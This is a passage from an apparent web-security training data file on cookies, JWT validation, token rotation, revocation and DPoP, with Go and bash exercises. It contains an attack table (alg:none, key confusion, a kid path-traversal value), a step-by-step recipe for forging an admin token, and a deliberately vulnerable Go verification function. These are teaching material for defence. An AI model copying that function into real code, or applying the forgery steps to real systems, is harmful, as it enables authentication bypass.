<li><strong>Refresh tokens</strong>: revoke all refresh tokens / token families for the user in the authorization server, so no new access tokens are issued.</li>
<li><strong>Access tokens (JWT)</strong>: they remain valid until <code>exp</code>. Options: keep TTL short (5 min) and accept the window; or store a per-user <code>tokens_valid_after</code> timestamp (cached, pushed via pub/sub) and reject tokens with <code>iat</code> older than it; or use introspection for high-risk APIs.</li>
<li><strong>Federated sessions</strong>: trigger OIDC back-channel logout / SAML SLO so downstream apps drop their sessions too.</li>
</ul>
<p>Also: do it automatically on password reset and MFA reset, and notify the user.</p>`
        }
      ],
      quiz: [
        { q: 'What does the HttpOnly cookie attribute prevent?', a: 'Reading the cookie from JavaScript (document.cookie), so XSS cannot directly exfiltrate it.' },
        { q: 'Which constraints does the __Host- cookie prefix enforce?', a: 'Secure must be set, Path must be /, and no Domain attribute (host-only), preventing subdomains from setting or overwriting it.' },
        { q: 'What does SameSite=None require?', a: 'The Secure attribute; otherwise browsers reject the cookie.' },
        { q: 'When does a SameSite=Lax cookie get sent on a cross-site request?', a: 'Only on top-level navigations using safe methods (e.g. clicking a link causing a GET); not on cross-site POSTs, iframes or fetch/XHR.' },
        { q: 'Are app.example.com and evil.example.com same-site or same-origin?', a: 'Same-site (same registrable domain example.com) but cross-origin (different hosts).' },
        { q: 'What is the primary fix for session fixation?', a: 'Issue a new session ID on login and every privilege change, invalidating the old one; never accept client-chosen IDs.' },
        { q: 'Why is naive (unsigned) double-submit CSRF protection weak?', a: 'An attacker who can set cookies (e.g. from a sibling subdomain) can plant a matching cookie and header value; signing/binding the token to the session prevents this.' },
        { q: 'What does a Backend-for-Frontend do in OAuth for SPAs?', a: 'It acts as a confidential client, performs the OAuth flow and keeps tokens server-side, giving the browser only an HttpOnly session cookie.' }
      ],
      resources: [
        { title: 'OWASP Session Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP Cross-Site Request Forgery Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', type: 'docs' },
        { title: 'MDN — Set-Cookie header', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie', type: 'docs' },
        { title: 'RFC 6265 — HTTP State Management Mechanism (Cookies)', url: 'https://datatracker.ietf.org/doc/html/rfc6265', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 4 ─────────────────────────────────────────────
    {
      n: 4,
      title: 'Tokens & JWT',
      summary: `JSON Web Tokens from the bytes up: JWS/JWE structure, choosing HS256 vs RS256 vs ES256/EdDSA, the validation checklist that prevents alg:none and key-confusion attacks, access vs refresh tokens with rotation and reuse detection, revocation strategies, JWKS key rotation, and when opaque tokens with introspection are the better choice.`,
      topics: [
        {
          title: 'JWT, JWS and JWE Structure',
          def: `<p>A <strong>JWT</strong> (RFC 7519) is a compact, URL-safe set of <strong>claims</strong>. It is almost always a <strong>JWS</strong> (RFC 7515, signed) and occasionally a <strong>JWE</strong> (RFC 7516, encrypted).</p>
<ul>
<li><strong>JWS compact</strong>: <code>base64url(header) . base64url(payload) . base64url(signature)</code>. The signature covers the first two parts. The payload is only <em>encoded</em> — anyone can read it, so never put secrets or sensitive PII in it.</li>
<li><strong>JWE compact</strong>: five parts — header, encrypted content-encryption key, IV, ciphertext, authentication tag. Use when the token must be opaque to the client or intermediaries (e.g. ID tokens carrying PII to a specific RP). Nested JWT = sign then encrypt.</li>
</ul>
<p><strong>Header</strong>: <code>alg</code> (signature algorithm), <code>kid</code> (key id for lookup in a JWKS), <code>typ</code> (e.g. <code>at+jwt</code> for OAuth access tokens per RFC 9068, <code>JWT</code> otherwise).</p>
<p><strong>Registered claims</strong>:</p>
<table>
<thead><tr><th>Claim</th><th>Meaning</th><th>Validation</th></tr></thead>
<tbody>
<tr><td><code>iss</code></td><td>issuer</td><td>exact match with the expected issuer</td></tr>
<tr><td><code>sub</code></td><td>subject (user or client id)</td><td>stable, unique within issuer</td></tr>
<tr><td><code>aud</code></td><td>intended audience(s)</td><td>must contain <em>this</em> service</td></tr>
<tr><td><code>exp</code> / <code>nbf</code> / <code>iat</code></td><td>expiry, not-before, issued-at (Unix seconds)</td><td>check with small clock-skew leeway (&le; 60 s)</td></tr>
<tr><td><code>jti</code></td><td>unique token id</td><td>replay detection, denylisting</td></tr>
</tbody>
</table>
<p>Common private claims: <code>scope</code>, <code>client_id</code>, <code>tid</code> (tenant), <code>roles</code>, <code>azp</code>, <code>auth_time</code>, <code>acr</code>/<code>amr</code>. Keep tokens small — they travel on every request.</p>`,
          interview: 'Be crisp: JWT is a claims format; JWS signs (integrity, readable), JWE encrypts (confidentiality). Base64url is not encryption. Know every registered claim and what the verifier must check for each.',
          examples: [
            {
              label: 'Decoded access token (RFC 9068 profile)',
              lang: 'json',
              code: `// header
{ "alg": "ES256", "typ": "at+jwt", "kid": "2026-10-a" }

// payload
{
  "iss": "https://auth.example.com",
  "sub": "u_8f3a2c",
  "aud": "https://orders.api.example.com",
  "client_id": "web-bff",
  "scope": "orders:read orders:write",
  "tid": "tenant-42",
  "iat": 1793275200,
  "nbf": 1793275200,
  "exp": 1793275500,
  "jti": "01JBX9Q7R4N8Z2K5W3T6Y1V0CD"
}

// signature: ECDSA P-256 over ASCII(base64url(header) + "." + base64url(payload)), 64 bytes (r||s)`
            }
          ]
        },
        {
          title: 'Signing Algorithms: HS256 vs RS256 vs ES256 vs EdDSA',
          def: `<table>
<thead><tr><th>alg</th><th>Type</th><th>Key</th><th>Signature size</th><th>Notes</th></tr></thead>
<tbody>
<tr><td><strong>HS256</strong></td><td>HMAC-SHA-256 (symmetric)</td><td>shared secret &ge; 256 bits</td><td>32 B</td><td>every verifier can also <em>mint</em> tokens; only for a single trusted party; weak secrets are brute-forced offline</td></tr>
<tr><td><strong>RS256</strong></td><td>RSA PKCS#1 v1.5 + SHA-256</td><td>RSA &ge; 2048 (3072 preferred)</td><td>256–384 B</td><td>most widely supported; slow signing, fast verify</td></tr>
<tr><td><strong>PS256</strong></td><td>RSA-PSS</td><td>RSA &ge; 2048</td><td>256 B</td><td>modern RSA padding; FAPI requires PS256 or ES256</td></tr>
<tr><td><strong>ES256</strong></td><td>ECDSA P-256</td><td>EC P-256</td><td>64 B</td><td>small and fast; needs a sound nonce (Go's implementation is safe)</td></tr>
<tr><td><strong>EdDSA</strong></td><td>Ed25519</td><td>Ed25519</td><td>64 B</td><td>deterministic, fast, misuse-resistant; check library/IdP support</td></tr>
</tbody>
</table>
<p><strong>Rule of thumb</strong>: whenever the issuer and verifiers are different services, use <strong>asymmetric</strong> signatures — the issuer keeps the private key (ideally in KMS/HSM) and everyone else gets public keys via JWKS. A leaked public key is harmless; a leaked HS256 secret lets an attacker forge any token for every service that shares it.</p>
<p>HS256 is acceptable when the same service both issues and verifies (e.g. its own short-lived internal tokens), with a high-entropy random key — never a human password like <code>secret123</code> (hashcat cracks weak HS256 secrets from a single token).</p>
<p>Keys are bound to an algorithm: a verifier must decide the algorithm from <em>its own configuration / the JWK</em>, not from the attacker-controlled <code>alg</code> header.</p>`,
          interview: 'Asked as "HS256 or RS256?": asymmetric for multi-party verification, symmetric only when issuer == verifier. Mention ES256/EdDSA for smaller tokens, key storage in KMS/HSM, and that the algorithm must be pinned per key.',
          examples: [
            {
              label: 'Generate signing keys with openssl',
              lang: 'bash',
              code: `# ES256 (P-256)
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out es256.key
openssl pkey -in es256.key -pubout -out es256.pub

# Ed25519 (EdDSA)
openssl genpkey -algorithm ed25519 -out ed25519.key

# RSA 3072 (RS256/PS256)
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out rs256.key

# HS256 secret: 32 random bytes, never a password
openssl rand -base64 32`
            }
          ]
        },
        {
          title: 'Mandatory Validation and Common JWT Attacks',
          def: `<p><strong>Validation checklist</strong> (RFC 8725 JWT BCP) — every item, every request:</p>
<ol>
<li>Parse strictly; reject tokens that are too large or malformed.</li>
<li>Check <code>alg</code> against an <strong>allow-list</strong> for this issuer (e.g. only <code>ES256</code>); reject <code>none</code>.</li>
<li>Select the key by <code>kid</code> from the issuer's <strong>trusted JWKS</strong> (configured URL, never from token headers like <code>jku</code>/<code>x5u</code>/<code>jwk</code>).</li>
<li>Verify the <strong>signature</strong>.</li>
<li>Validate <code>exp</code> (required), <code>nbf</code>, <code>iat</code> with small leeway.</li>
<li>Validate <code>iss</code> exactly and that <code>aud</code> contains this service.</li>
<li>Validate <code>typ</code> to prevent token substitution (an ID token used as an access token).</li>
<li>Then authorize: scopes/roles/tenant for the requested resource.</li>
</ol>
<table>
<thead><tr><th>Attack</th><th>How it works</th><th>Prevention</th></tr></thead>
<tbody>
<tr><td><code>alg: none</code></td><td>unsigned token accepted by a naive library</td><td>alg allow-list</td></tr>
<tr><td>Key confusion (RS256 &rarr; HS256)</td><td>attacker signs with HMAC using the server's <em>public</em> RSA key as the secret</td><td>pin alg per key; typed keys</td></tr>
<tr><td><code>kid</code> injection</td><td><code>kid: "../../dev/null"</code> or SQL injection in key lookup</td><td>treat kid as an opaque map key</td></tr>
<tr><td><code>jku</code>/<code>x5u</code>/<code>jwk</code> header</td><td>token points to attacker's own key</td><td>ignore; keys only from configured JWKS</td></tr>
<tr><td>Missing <code>aud</code> check</td><td>token for service A replayed at service B</td><td>require own audience</td></tr>
<tr><td>Weak HMAC secret</td><td>offline brute force</td><td>256-bit random key or asymmetric</td></tr>
<tr><td>Library bugs</td><td>e.g. Java "psychic signatures" (CVE-2022-21449) accepted ECDSA r=s=0</td><td>patch, test with negative vectors</td></tr>
</tbody>
</table>`,
          interview: 'Recite the checklist in order and name at least four attacks with their fixes. Interviewers love the RS256-to-HS256 confusion attack: explain that the public key becomes an HMAC secret if the server lets the token choose the algorithm.',
          examples: [
            {
              label: 'Strict verification with golang-jwt/jwt/v5',
              lang: 'go',
              code: `parser := jwt.NewParser(
    jwt.WithValidMethods([]string{"ES256"}),          // alg allow-list: rejects none, HS256, RS256
    jwt.WithIssuer("https://auth.example.com"),
    jwt.WithAudience("https://orders.api.example.com"),
    jwt.WithExpirationRequired(),
    jwt.WithIssuedAt(),
    jwt.WithLeeway(30*time.Second),
)

token, err := parser.ParseWithClaims(raw, &Claims{}, func(t *jwt.Token) (any, error) {
    kid, _ := t.Header["kid"].(string)
    key, ok := trustedKeys.Load(kid) // map populated from the configured JWKS URL only
    if !ok {
        return nil, fmt.Errorf("unknown kid %q", kid)
    }
    return key.(*ecdsa.PublicKey), nil // typed key: an HMAC verification can never use it
})
if err != nil || !token.Valid {
    return nil, ErrUnauthenticated
}
if typ, _ := token.Header["typ"].(string); !strings.EqualFold(typ, "at+jwt") && !strings.EqualFold(typ, "application/at+jwt") {
    return nil, ErrUnauthenticated // reject ID tokens or other JWT types used as access tokens
}`
            }
          ]
        },
        {
          title: 'Access vs Refresh Tokens, Rotation and Reuse Detection',
          def: `<table>
<thead><tr><th></th><th>Access token</th><th>Refresh token</th></tr></thead>
<tbody>
<tr><td>Sent to</td><td>resource servers (APIs) on every call</td><td>only the authorization server's token endpoint</td></tr>
<tr><td>Lifetime</td><td>short: 5–15 min</td><td>hours to weeks, with idle and absolute limits</td></tr>
<tr><td>Format</td><td>JWT or opaque</td><td>opaque random string (stored hashed)</td></tr>
<tr><td>Revocation</td><td>hard if JWT (wait for exp)</td><td>easy: server-side record</td></tr>
</tbody>
</table>
<p><strong>Refresh token rotation</strong>: every refresh returns a <em>new</em> refresh token and invalidates the old one. All tokens descending from one login form a <strong>token family</strong>.</p>
<ol>
<li>Client presents RT<sub>1</sub>; server marks RT<sub>1</sub> used, issues AT + RT<sub>2</sub> (same family, same absolute expiry).</li>
<li>Attacker steals RT<sub>1</sub> earlier and uses it after the client already rotated: RT<sub>1</sub> is marked used &rarr; <strong>reuse detected</strong>.</li>
<li>Server revokes the <strong>entire family</strong> (RT<sub>2</sub> too), forcing re-login; raise a security event.</li>
</ol>
<p>Practical details: allow a tiny grace period (a few seconds) for legitimate concurrent refreshes or network retries; preserve the family's absolute expiry so rotation cannot extend a session forever; bind refresh tokens to the <code>client_id</code>.</p>
<p>Per the OAuth 2.0 Security BCP (RFC 9700) refresh tokens for <strong>public clients</strong> must be either rotated or <strong>sender-constrained</strong>: <strong>DPoP</strong> (RFC 9449, the client proves possession of a private key on each request) or <strong>mTLS-bound tokens</strong> (RFC 8705, token bound to the client certificate thumbprint <code>cnf.x5t#S256</code>). Sender-constraining also protects access tokens from replay if stolen.</p>`,
          interview: 'Explain rotation plus reuse detection step by step and why revoking the whole family is the key move. Mention grace windows, absolute lifetime, and sender-constrained tokens (DPoP/mTLS) as the stronger alternative from RFC 9700.',
          examples: [
            {
              label: 'Refresh request and rotated response',
              lang: 'http',
              code: `POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded
DPoP: eyJ0eXAiOiJkcG9wK2p3dCIsImFsZyI6IkVTMjU2IiwiandrIjp7Li4ufX0...

grant_type=refresh_token&refresh_token=rt_1Vb3...&client_id=mobile-app

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "eyJhbGciOiJFUzI1NiIsInR5cCI6ImF0K2p3dCJ9...",
  "token_type": "DPoP",
  "expires_in": 300,
  "refresh_token": "rt_9QkZ...",          // new token; rt_1Vb3 is now marked used
  "scope": "orders:read"
}`
            }
          ]
        },
        {
          title: 'Revocation, Opaque Tokens and Introspection',
          def: `<p>Self-contained JWTs are valid until <code>exp</code> by design. Revocation strategies, from cheapest to strongest:</p>
<ol>
<li><strong>Short access-token TTL</strong> (5 min) + revocable refresh tokens. Revocation latency = TTL. Simplest; usually enough.</li>
<li><strong>Denylist by <code>jti</code></strong>: on logout/compromise, put the <code>jti</code> in Redis with TTL = remaining lifetime; verifiers check it. Small list because entries expire.</li>
<li><strong>Per-subject cut-off</strong>: store <code>revoked_before[sub] = timestamp</code> (or a token version); reject tokens with <code>iat</code> earlier. Distribute via pub/sub and cache in each service.</li>
<li><strong>Introspection</strong> (RFC 7662): the resource server asks the authorization server on each request (with caching) whether the token is active. Works for opaque tokens and gives near-real-time revocation at the cost of latency and a hard dependency.</li>
<li><strong>Push signals</strong>: OpenID Shared Signals / CAEP events ("session revoked") let the IdP notify relying parties.</li>
</ol>
<p><strong>Opaque tokens</strong> are random strings whose meaning lives only at the authorization server. Advantages: instant revocation, no claim leakage to clients, tiny size, no key distribution. Drawbacks: a network call (introspection) per request or per cache window. A common hybrid: <em>opaque tokens at the edge</em>, and the API gateway exchanges them via introspection for a short-lived internal JWT ("phantom token" pattern).</p>
<p>The <strong>revocation endpoint</strong> (RFC 7009) lets clients revoke refresh/access tokens on logout.</p>`,
          interview: 'Senior answer: you cannot "un-sign" a JWT, so pick a revocation latency budget, then choose short TTL, jti denylist, per-user cut-off or introspection. Know the phantom-token pattern and RFC 7662/7009.',
          examples: [
            {
              label: 'Token introspection (RFC 7662)',
              lang: 'http',
              code: `POST /oauth/introspect HTTP/1.1
Host: auth.example.com
Authorization: Basic b3JkZXJzLWFwaTpzM2NyM3Q=       (the resource server authenticates itself)
Content-Type: application/x-www-form-urlencoded

token=at_mF_9.B5f-4.1JqM

HTTP/1.1 200 OK
Content-Type: application/json

{"active":true,"client_id":"web-bff","sub":"u_8f3a2c","scope":"orders:read",
 "aud":"https://orders.api.example.com","iss":"https://auth.example.com","exp":1793275500}

(revoked or expired token -> {"active":false} and nothing else)`
            }
          ]
        },
        {
          title: 'JWKS and Signing-Key Rotation',
          def: `<p>Issuers publish public keys as a <strong>JSON Web Key Set</strong> (RFC 7517) at a <code>jwks_uri</code> advertised in discovery metadata. Verifiers cache the JWKS and pick a key by the token's <code>kid</code>.</p>
<p><strong>Zero-downtime rotation</strong>:</p>
<ol>
<li>Generate the new key pair (in KMS/HSM) with a new <code>kid</code>.</li>
<li><strong>Publish</strong> the new public key in the JWKS alongside the old one — but don't sign with it yet.</li>
<li>Wait at least the verifiers' maximum JWKS cache time (e.g. 24 h + margin).</li>
<li><strong>Switch signing</strong> to the new key.</li>
<li>Keep the old public key published until all tokens it signed have expired (max token lifetime).</li>
<li><strong>Remove</strong> the old key.</li>
</ol>
<p><strong>Emergency rotation</strong> (private key compromised): sign with a new key immediately and remove the compromised key from the JWKS at once — accepting that valid tokens signed by it fail — and revoke refresh tokens.</p>
<p><strong>Verifier behavior</strong>: refresh the JWKS on a schedule and on an <em>unknown kid</em>, but rate-limit refetches (an attacker sending random <code>kid</code>s must not make you hammer the IdP). Fetch only from a configured HTTPS URL. Libraries such as <code>github.com/MicahParks/keyfunc</code> implement this for golang-jwt.</p>`,
          interview: 'Describe the publish-wait-switch-retire sequence and why overlap matters (caches). Mention rate-limited refresh on unknown kid and how emergency rotation differs.',
          examples: [
            {
              label: 'JWKS during rotation (two keys published)',
              lang: 'json',
              code: `{
  "keys": [
    { "kty": "EC", "crv": "P-256", "kid": "2026-11-a", "use": "sig", "alg": "ES256",
      "x": "f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU",
      "y": "x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0" },
    { "kty": "EC", "crv": "P-256", "kid": "2026-10-a", "use": "sig", "alg": "ES256",
      "x": "WKn-ZIGevcwGIyyrzFoZNBdaq9_TsqzGl96oc0CWuis",
      "y": "y77t-RvAHRKTsSGdIYUfweuOvwrvDD-Q3Hv5J0fSKbE" }
  ]
}`
            }
          ]
        },
        {
          title: 'Sender-Constrained Tokens: DPoP and mTLS-Bound Tokens',
          def: `<p>A <strong>bearer token</strong> works for whoever holds it: copied from a log, a proxy, browser storage or an infostealer, it can be replayed from anywhere until it expires. <strong>Sender-constrained</strong> (proof-of-possession) tokens are bound to a key the legitimate client holds, so a stolen copy is useless without the private key. RFC 9700 recommends them, OAuth 2.1 requires refresh tokens of public clients to be sender-constrained or rotated, and FAPI 2.0 requires them for access tokens.</p>
<table>
<thead><tr><th></th><th><strong>DPoP</strong> (RFC 9449)</th><th><strong>mTLS-bound</strong> (RFC 8705)</th></tr></thead>
<tbody>
<tr><td>Proof of possession</td><td>a fresh signed JWT (DPoP proof) in a <code>DPoP</code> header on every HTTP request</td><td>the TLS client certificate on the connection</td></tr>
<tr><td>Binding inside the token</td><td><code>cnf.jkt</code> = SHA-256 JWK thumbprint (RFC 7638) of the client's public key</td><td><code>cnf.x5t#S256</code> = SHA-256 thumbprint of the client certificate</td></tr>
<tr><td>Header at the API</td><td><code>Authorization: DPoP &lt;token&gt;</code>, <code>token_type=DPoP</code></td><td><code>Authorization: Bearer &lt;token&gt;</code> over mTLS</td></tr>
<tr><td>Fits</td><td>SPAs, mobile and desktop apps, any HTTP client; works through TLS-terminating proxies (application layer)</td><td>backend services and B2B partners that already run a PKI</td></tr>
<tr><td>Costs</td><td>a signature per request, a <code>jti</code> replay cache, clock tolerance</td><td>certificate lifecycle; TLS termination before the RS breaks the binding unless the verified cert is forwarded securely</td></tr>
</tbody>
</table>
<p><strong>DPoP step by step</strong>:</p>
<ol>
<li>The client generates a key pair once per installation or session, ideally <strong>non-extractable</strong> (WebCrypto <code>extractable: false</code>, Secure Enclave / Android Keystore).</li>
<li>Token request (code, refresh or client credentials) carries a proof: header <code>{typ: "dpop+jwt", alg: "ES256", jwk: &lt;public key&gt;}</code>, claims <code>jti</code>, <code>htm</code> (HTTP method), <code>htu</code> (URL without query/fragment), <code>iat</code>. The AS binds the access token (<code>cnf.jkt</code>) and, for public clients, the refresh token to that key.</li>
<li>Every API call sends a new proof for <em>that</em> request plus <code>ath</code> = base64url(SHA-256(access token)).</li>
<li>The resource server verifies the proof signature with the embedded public JWK (asymmetric algorithms only), <code>typ</code>, <code>htm</code>/<code>htu</code> against the actual request, <code>iat</code> within a short window, <code>jti</code> unseen, <code>ath</code>, and finally that the JWK thumbprint equals the token's <code>cnf.jkt</code>. A DPoP-bound token presented with the <code>Bearer</code> scheme must be rejected (downgrade).</li>
<li>Optional server nonces (<code>DPoP-Nonce</code> header, <code>use_dpop_nonce</code> error) stop attackers who briefly ran code on the device from pre-generating proofs for later; <code>dpop_jkt</code> on the authorization request binds even the code to the key.</li>
</ol>
<p><strong>Limits</strong>: DPoP stops <em>offline replay</em> of stolen tokens, not an attacker who controls the client right now (XSS can ask the non-extractable key to sign proofs while the page is open). It complements, not replaces, short lifetimes, refresh rotation and a BFF. mTLS-bound tokens have the same property for confidential clients and come almost free when service-to-service mTLS already exists.</p>`,
          interview: 'Explain why bearer tokens are replayable and how proof-of-possession fixes it: the token carries a key thumbprint (cnf.jkt or cnf.x5t#S256) and every use proves possession of the private key. Walk through the DPoP proof claims (htm, htu, iat, jti, ath) and what the resource server checks, compare DPoP with mTLS-bound tokens, and be honest about the limit: XSS on a live page can still sign proofs.',
          examples: [
            { label: 'DPoP proof (decoded) and the API request carrying it', lang: 'http', code: `# Proof header
{ "typ": "dpop+jwt", "alg": "ES256",
  "jwk": { "kty": "EC", "crv": "P-256", "x": "l8tFrhx-34tV3hRICRDY9zCkDlpBhF42UQUfWVAWBFs",
           "y": "9VE4jf_Ok_o64zbTTlcuNJajHmt6v9TDVrU0CdvGRDA" } }
# Proof claims
{ "jti": "e1j3V_bKic8-LAEB", "htm": "GET", "htu": "https://orders.api.example.com/v1/orders",
  "iat": 1793275260, "ath": "fUHyO2r2Z3DZ53EsNrWBb0xWXoaNy59IiKCAqksmQEo" }

GET /v1/orders HTTP/1.1
Host: orders.api.example.com
Authorization: DPoP eyJhbGciOiJFUzI1NiIsInR5cCI6ImF0K2p3dCJ9...   (access token with "cnf":{"jkt":"0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I"})
DPoP: eyJ0eXAiOiJkcG9wK2p3dCIsImFsZyI6IkVTMjU2IiwiandrIjp7...

HTTP/1.1 401 Unauthorized                      (if the proof is missing, stale, replayed or for another key)
WWW-Authenticate: DPoP error="invalid_dpop_proof", algs="ES256 EdDSA"` }
          ]
        }
      ],
      problems: [
        {
          t: 'Decode a JWT from the command line and read its claims',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>Split on <code>.</code>; base64url-decode parts 1 and 2 (translate <code>-_</code> to <code>+/</code> and add padding).</li><li>Check <code>alg</code>, <code>kid</code>, <code>typ</code>, <code>iss</code>, <code>aud</code>, <code>exp</code>.</li><li>Decoding is not verifying — never trust a decoded token without signature validation.</li></ul>`,
          solution: `b64url_decode() {
  local s=$(echo -n "$1" | tr '_-' '/+')
  while [ $(( \${#s} % 4 )) -ne 0 ]; do s="$s="; done
  echo -n "$s" | base64 -d
}

TOKEN='eyJhbGciOiJFUzI1NiIsInR5cCI6ImF0K2p3dCIsImtpZCI6IjIwMjYtMTAtYSJ9.eyJpc3MiOi...'
b64url_decode "$(echo "$TOKEN" | cut -d. -f1)" | jq .     # header
b64url_decode "$(echo "$TOKEN" | cut -d. -f2)" | jq .     # payload

# Human-readable expiry
b64url_decode "$(echo "$TOKEN" | cut -d. -f2)" | jq -r '.exp | todate'`,
          lang: 'bash'
        },
        {
          t: 'Issue and verify an ES256 JWT in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li><code>ecdsa.GenerateKey(elliptic.P256(), rand.Reader)</code>.</li><li><code>jwt.NewWithClaims(jwt.SigningMethodES256, claims)</code>, set <code>kid</code> header, <code>SignedString(priv)</code>.</li><li>Verify with <code>WithValidMethods</code>, issuer and audience options.</li></ul>`,
          solution: `func main() {
    priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
    if err != nil {
        log.Fatal(err)
    }
    now := time.Now()
    claims := jwt.RegisteredClaims{
        Issuer:    "https://auth.example.com",
        Subject:   "u_8f3a2c",
        Audience:  jwt.ClaimStrings{"https://orders.api.example.com"},
        IssuedAt:  jwt.NewNumericDate(now),
        NotBefore: jwt.NewNumericDate(now),
        ExpiresAt: jwt.NewNumericDate(now.Add(5 * time.Minute)),
        ID:        rand.Text(),
    }
    tok := jwt.NewWithClaims(jwt.SigningMethodES256, claims)
    tok.Header["kid"] = "2026-10-a"
    tok.Header["typ"] = "at+jwt"
    signed, err := tok.SignedString(priv)
    if err != nil {
        log.Fatal(err)
    }

    var got jwt.RegisteredClaims
    _, err = jwt.ParseWithClaims(signed, &got,
        func(t *jwt.Token) (any, error) { return &priv.PublicKey, nil },
        jwt.WithValidMethods([]string{"ES256"}),
        jwt.WithIssuer("https://auth.example.com"),
        jwt.WithAudience("https://orders.api.example.com"),
        jwt.WithExpirationRequired(),
    )
    fmt.Println("valid:", err == nil, "sub:", got.Subject)
}`,
          lang: 'go'
        },
        {
          t: 'Implement JWT auth middleware in Go',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Extract <code>Authorization: Bearer</code>; 401 + <code>WWW-Authenticate</code> on any failure.</li><li>Keys from the IdP's JWKS (cached, refreshed on unknown kid) — e.g. <code>keyfunc.NewDefaultCtx</code>.</li><li>Parser options: allowed algs, issuer, audience, exp required, leeway.</li><li>Put typed claims in the context; a separate <code>RequireScope</code> middleware returns 403.</li></ul>`,
          solution: `type Claims struct {
    Scope    string \`json:"scope"\`
    TenantID string \`json:"tid"\`
    jwt.RegisteredClaims
}

func (c *Claims) HasScope(s string) bool { return slices.Contains(strings.Fields(c.Scope), s) }

type claimsKey struct{}

func JWTAuth(ctx context.Context, jwksURL, issuer, audience string) (func(http.Handler) http.Handler, error) {
    jwks, err := keyfunc.NewDefaultCtx(ctx, []string{jwksURL}) // background refresh + rate-limited refresh on unknown kid
    if err != nil {
        return nil, err
    }
    parser := jwt.NewParser(
        jwt.WithValidMethods([]string{"ES256", "RS256"}),
        jwt.WithIssuer(issuer),
        jwt.WithAudience(audience),
        jwt.WithExpirationRequired(),
        jwt.WithLeeway(30*time.Second),
    )
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            scheme, raw, ok := strings.Cut(r.Header.Get("Authorization"), " ")
            if !ok || !strings.EqualFold(scheme, "Bearer") || len(raw) > 8192 {
                unauthorized(w, "invalid_request")
                return
            }
            var c Claims
            if _, err := parser.ParseWithClaims(raw, &c, jwks.Keyfunc); err != nil {
                unauthorized(w, "invalid_token") // do not echo err details to the client
                return
            }
            next.ServeHTTP(w, r.WithContext(context.WithValue(r.Context(), claimsKey{}, &c)))
        })
    }, nil
}

func RequireScope(scope string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        c, _ := r.Context().Value(claimsKey{}).(*Claims)
        if c == nil || !c.HasScope(scope) {
            w.Header().Set("WWW-Authenticate", \`Bearer error="insufficient_scope", scope="\`+scope+\`"\`)
            http.Error(w, "forbidden", http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}

func unauthorized(w http.ResponseWriter, code string) {
    w.Header().Set("WWW-Authenticate", \`Bearer realm="api", error="\`+code+\`"\`)
    http.Error(w, "unauthorized", http.StatusUnauthorized)
}

// wiring (Go 1.22+ mux):
// mux.Handle("GET /orders/{id}", RequireScope("orders:read", http.HandlerFunc(getOrder)))
// handler := auth(mux)`,
          lang: 'go'
        },
        {
          t: 'Spot the vulnerabilities in a JWT verification function',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Look for: algorithm taken from the token, missing audience/issuer, unverified parsing, key chosen from token headers, errors ignored.</li><li>Each finding maps to a real CVE class.</li></ul>`,
          solution: `// VULNERABLE
func verify(raw string) (*Claims, error) {
    var c Claims
    tok, _ := jwt.ParseWithClaims(raw, &c, func(t *jwt.Token) (any, error) {
        if t.Method.Alg() == "HS256" {
            return publicKeyPEM, nil            // (1) key confusion: RSA public key bytes used as HMAC secret
        }
        if u, ok := t.Header["jku"].(string); ok {
            return fetchKey(u)                  // (2) attacker-controlled key URL (also SSRF)
        }
        return rsaPub, nil
    })                                          // (3) no WithValidMethods, no iss/aud, exp not required
    if tok == nil {                             // (4) error ignored; only nil-check
        return nil, errors.New("bad token")
    }
    return &c, nil                              // (5) returns claims even if !tok.Valid
}

// FIXED
func verify(raw string) (*Claims, error) {
    var c Claims
    _, err := parser.ParseWithClaims(raw, &c, func(t *jwt.Token) (any, error) {
        return keys.ECDSA(t.Header["kid"]) // trusted JWKS only, typed key
    })  // parser built with WithValidMethods("ES256"), WithIssuer, WithAudience, WithExpirationRequired
    if err != nil {
        return nil, ErrUnauthenticated
    }
    return &c, nil
}`,
          lang: 'go'
        },
        {
          t: 'Explain and prevent the RS256-to-HS256 key confusion attack',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>The server expects RS256 and has an RSA public key (which is public).</li><li>The attacker crafts a token with <code>alg: HS256</code> and computes HMAC using the public key bytes as the secret.</li><li>A library that calls <code>verify(token, key)</code> with the algorithm from the header accepts it.</li></ul>`,
          solution: `Attack:
1. Attacker downloads the issuer's public key (JWKS / PEM) - it's public.
2. Builds header {"alg":"HS256","typ":"JWT"} and payload {"sub":"admin","exp":...}.
3. signature = HMAC-SHA256(key = PEM bytes of the RSA public key, data = header.payload).
4. Vulnerable server: verify(token, rsaPublicKeyBytes) -> library reads alg=HS256 from header ->
   computes HMAC with the same bytes -> signature matches -> forged admin token accepted.

Prevention:
- Pin the algorithm per key/issuer on the server (allow-list, e.g. WithValidMethods([]string{"RS256"})).
- Use typed keys (*rsa.PublicKey); golang-jwt's HMAC method rejects non-[]byte keys.
- Use the JWK's "alg"/"kty" to bind key to algorithm; never let the token pick.
- Regression test: craft an HS256 token signed with the public key and assert 401.`,
          lang: 'text'
        },
        {
          t: 'Implement refresh token rotation with reuse detection',
          d: 'hard',
          type: 'coding',
